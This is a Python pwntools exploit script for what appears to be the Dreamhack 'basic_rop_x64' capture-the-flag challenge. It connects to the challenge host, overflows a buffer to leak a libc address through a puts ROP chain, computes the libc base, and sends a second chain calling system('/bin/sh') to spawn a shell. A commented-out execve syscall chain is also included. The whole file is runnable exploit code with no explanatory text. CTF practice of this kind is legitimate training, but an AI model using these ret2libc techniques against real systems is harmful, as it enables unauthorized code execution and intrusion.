#!/usr/bin/env python3

from pwn import *

exe = ELF("./basic_rop_x64_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.35.so", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("host1.dreamhack.games", 18653)

    return p


def main():
    p = conn()

    input()

    pop_rdi = 0x0000000000400883
    payload = b'a'*72 + p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.sym['main'])
    p.send(payload)
    p.recvuntil(b'a'*64)
    libc_leak = u64(p.recv(6) + b'\0\0')
    print("Libc leak: " + hex(libc_leak))
    libc.address = libc_leak - libc.sym['puts']
    print("Libc base: " + hex(libc.address))

    # ko tim thay gadget pop rdx
    pop_rdi = 0x000000000002a3e5 + libc.address
    ret = 0x0000000000029cd6 + libc.address
    pop_rsi = 0x000000000002be51 + libc.address
    pop_rax = 0x0000000000045eb0 + libc.address
    syscall = 0x0000000000029db4 + libc.address
    # payload = b'a'*72 + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
    # payload += p64(pop_rax) + p64(0x3b)
    # payload += p64(pop_rsi) + p64(0)
    # payload += p64(pop_rdx) + p64(0)
    # payload += p64(syscall)
    payload = b'a'*72 + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(ret) + p64(libc.sym['system'])
    p.send(payload)

    p.interactive()


if __name__ == "__main__":
    main()
